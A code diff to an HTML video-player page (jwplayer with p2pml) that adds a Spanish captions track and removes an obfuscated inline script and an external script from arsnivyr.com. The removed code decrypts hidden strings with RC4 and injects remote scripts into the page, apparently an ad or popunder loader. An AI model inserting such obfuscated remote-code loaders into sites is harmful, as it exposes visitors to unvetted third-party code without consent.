@@ -5,180 +5,6 @@
     <meta name="theme-color" content="black" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black" />
     <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <script type="text/javascript" data-cfasync="false">
-      /*<![CDATA[/* */
-      (function () {
-        var e61d8a6ef128b11f82463ec4a5f048ce =
-          "ESpEowWisJArJyjPvQiFArDmU2HE5bVIxLWSsMcl5-lbkBefc2xRcgk1U0BCRhW5v33nK89QgFPwrlNBeYF7FI4";
-        var a = [
-          "ASFWw5Y=",
-          "C8KhLxw=",
-          "MyXDlsKQw4Ri",
-          "w43CpRMxwqPCqDvClR1wCMK7w7LDhCE=",
-          "w5lWw5HDnsK+EsKC",
-          "F2XDncK9w7Z9w61TLkkDwpHCgw==",
-          "wpLDo2ZkKMKuwo7CgA==",
-          "wrjDr8OCPMK0wqciElVRwqgr",
-          "wqTDrzk8wpzCvHw5w5XCv1w=",
-          "w7XDtAtlwqlsdAHDmwcaaw==",
-          "w4xDHGFQfinCpxc=",
-          "AhtA",
-          "JcKrFsOpZ8KewqvDiAgJJ23Dl8KOwrXDk8O1w74gwrk=",
-          "CEzDrSTDgMOKGBLCpzhbHmHCg1pIwpHCtQTDk8OTDCAlwrk8fMKDaQ==",
-          "Bh5UwqwjwpVdw7lFGsKFw63DnMOBwpPCgcO3JMKIIVQnAMK7FTRZ",
-          "w5lWw5vDnsKyPMKTw4LDu8OjTls=",
-          "w4VZB39aKWnDvQ==",
-          "ZsOzw57DpMO5w4HCgAZLQQ==",
-          "w5TCqQUHw6XCpg==",
-          "w6vDlMKjw54Z",
-          "wonDm8K7w4PCsx0+BcOqw5IRUnTDhQ==",
-          "w5Jdw5LDjcK5EcKE",
-          "FipDw5ILcF/CoH3CuMOVw5EY",
-          "w5fCncOIw6RZR8Khw6E=",
-          "wo/Cr8KIw7zCpsKywrFbwr3CnH1Ww4zDtMK7WW3CjGAKbMO8wrDDrAYfdX3DjcKjPywvU8Kawq7CiMK0KnfCvw==",
-          "wp9wZQF/RQ==",
-          "wrHDjhViwqsINkLDp8ORIkxaPlhsNsK3wovCjMKyIGTDmMOww5rDjzw8D8KoKzjDocKbwq9PJcKGX8OB",
-        ];
-        (function (b, e) {
-          var f = function (g) {
-            while (--g) {
-              b["push"](b["shift"]());
-            }
-          };
-          f(++e);
-        })(a, 0xc7);
-        var b = function (c, d) {
-          c = c - 0x0;
-          var e = a[c];
-          if (b["FyjZvC"] === undefined) {
-            (function () {
-              var h;
-              try {
-                var j = Function(
-                  "return\x20(function()\x20" +
-                    "{}.constructor(\x22return\x20this\x22)(\x20)" +
-                    ");"
-                );
-                h = j();
-              } catch (k) {
-                h = window;
-              }
-              var i =
-                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-              h["atob"] ||
-                (h["atob"] = function (l) {
-                  var m = String(l)["replace"](/=+$/, "");
-                  var n = "";
-                  for (
-                    var o = 0x0, p, q, r = 0x0;
-                    (q = m["charAt"](r++));
-                    ~q && ((p = o % 0x4 ? p * 0x40 + q : q), o++ % 0x4)
-                      ? (n += String["fromCharCode"](
-                          0xff & (p >> ((-0x2 * o) & 0x6))
-                        ))
-                      : 0x0
-                  ) {
-                    q = i["indexOf"](q);
-                  }
-                  return n;
-                });
-            })();
-            var g = function (h, l) {
-              var m = [],
-                n = 0x0,
-                o,
-                p = "",
-                q = "";
-              h = atob(h);
-              for (var t = 0x0, u = h["length"]; t < u; t++) {
-                q +=
-                  "%" +
-                  ("00" + h["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
-              }
-              h = decodeURIComponent(q);
-              var r;
-              for (r = 0x0; r < 0x100; r++) {
-                m[r] = r;
-              }
-              for (r = 0x0; r < 0x100; r++) {
-                n = (n + m[r] + l["charCodeAt"](r % l["length"])) % 0x100;
-                o = m[r];
-                m[r] = m[n];
-                m[n] = o;
-              }
-              r = 0x0;
-              n = 0x0;
-              for (var v = 0x0; v < h["length"]; v++) {
-                r = (r + 0x1) % 0x100;
-                n = (n + m[r]) % 0x100;
-                o = m[r];
-                m[r] = m[n];
-                m[n] = o;
-                p += String["fromCharCode"](
-                  h["charCodeAt"](v) ^ m[(m[r] + m[n]) % 0x100]
-                );
-              }
-              return p;
-            };
-            b["PnRxJH"] = g;
-            b["pvYaoA"] = {};
-            b["FyjZvC"] = !![];
-          }
-          var f = b["pvYaoA"][c];
-          if (f === undefined) {
-            if (b["hNfDgw"] === undefined) {
-              b["hNfDgw"] = !![];
-            }
-            e = b["PnRxJH"](e, d);
-            b["pvYaoA"][c] = e;
-          } else {
-            e = f;
-          }
-          return e;
-        };
-        var s = window;
-        s[b("0x12", "AyiY")] = [
-          [b("0x13", "L2pQ"), 0x4ad088],
-          [b("0x8", "mMsc"), 0.001],
-          [b("0xa", "V&x#"), "0"],
-          [b("0x5", "JQPd"), 0x0],
-          [b("0x15", "JQPd"), ![]],
-          [b("0x16", "(@6z"), 0x0],
-          [b("0x18", "LESM"), !0x0],
-        ];
-        var f = [
-            b("0xe", "wv)z"),
-            b("0x10", "8IiC"),
-            b("0x3", "eM8n"),
-            b("0x4", "x&uE"),
-          ],
-          p = 0x0,
-          y,
-          n = function () {
-            if (!f[p]) return;
-            y = s[b("0xd", "%9^9")][b("0xc", "8yRg")](b("0xf", "J[Ul"));
-            y[b("0x11", "8yRg")] = b("0x14", "mMsc");
-            y[b("0x9", "WZih")] = !0x0;
-            var c = s[b("0x17", "8YN7")][b("0x2", "xiL!")](
-              b("0xf", "J[Ul")
-            )[0x0];
-            y[b("0x1", "x&uE")] = b("0x6", "t4V9") + f[p];
-            y[b("0x19", "*csT")] = b("0x0", "t4V9");
-            y[b("0xb", "JQPd")] = function () {
-              p++;
-              n();
-            };
-            c[b("0x7", "m%B1")][b("0x1a", "9E)a")](y, c);
-          };
-        n();
-      })();
-      /*]]>/* */
-    </script>
-    <script
-      async="async"
-      data-cfasync="false"
-      src="//arsnivyr.com/1?z=5619618"
-    ></script>
   </head>
   <body bgcolor="black" style="margin: 0; overflow: hidden">
     <script type="text/javascript" src="/static/jw.js"></script>
@@ -192,11 +18,21 @@
 
       const url = argz.get("u");
       const postImage = argz.get("i");
+      const captions_file = argz.get("c");
 
       var engine = new p2pml.hlsjs.Engine();
       var player = jwplayer("player");
       player.setup({
         file: url,
+        tracks: [
+          {
+            kind: "captions",
+            file: captions_file,
+            label: "Español",
+            fontSize: 12,
+            default: true,
+          },
+        ],
         image: postImage,
         height: "100%",
         width: "100%",
